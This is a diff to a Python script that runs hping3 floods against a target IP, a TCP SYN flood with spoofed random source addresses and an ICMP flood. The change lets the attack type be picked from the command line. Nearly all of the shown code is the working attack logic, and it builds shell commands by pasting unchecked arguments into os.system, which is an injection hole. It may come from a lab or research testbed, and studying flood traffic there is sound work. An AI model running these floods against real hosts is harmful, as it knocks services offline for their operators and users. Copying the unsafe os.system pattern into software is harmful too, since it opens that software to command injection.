@@ -13,8 +13,8 @@ PKTS_LEN = 1442
 DATA_LEN = 1000000
 DATA_STR = 'MB'
 INIT_WAIT = 1
-ICMP_DDoS = True
-TCP_DDoS = False
+ICMP_DDoS = False
+TCP_DDoS = True
 
 
 # Get the current time 
@@ -34,8 +34,8 @@ def stats():
 
 if __name__ == "__main__":
 	# Check the passed arguments
-	if len(sys.argv) != 2:
-		print(get_str_time() + ERROR_BAD_ARGV_FROM_USER + '\n\n\t Usage: python3 ' + sys.argv[0] + ' <Destination IP>')
+	if len(sys.argv) != 3:
+		print(get_str_time() + ERROR_BAD_ARGV_FROM_USER + '\n\n\t Usage: python3 ' + sys.argv[0] + ' <Destination IP> '+' <ICMP or TCP>')
 		exit(-1)
 	
 	# Initialize status variables
@@ -46,11 +46,12 @@ if __name__ == "__main__":
 	os.system('sleep ' + str(INIT_WAIT))
 
 	# hping3 for TCP DDoS
-	if TCP_DDoS:
+	if sys.argv[2] == "TCP":
 		os.system('hping3 -c 10000 -d 120 -S -w 64 -p 80 --faster --rand-source ' + sys.argv[1])
-	# hping3 for ICMP DDoS
-	if ICMP_DDoS:
+	elif sys.argv[2] == "ICMP":
 		os.system('hping3 -V -1 -c 600 -d 1400 --faster ' + sys.argv[1])
+	else:
+		print("Attack types supported: TCP and ICMP")
 
 	# Show the stats
 	print('\n\n'+get_str_time() + INFO_STATS + '\n\n' + stats())
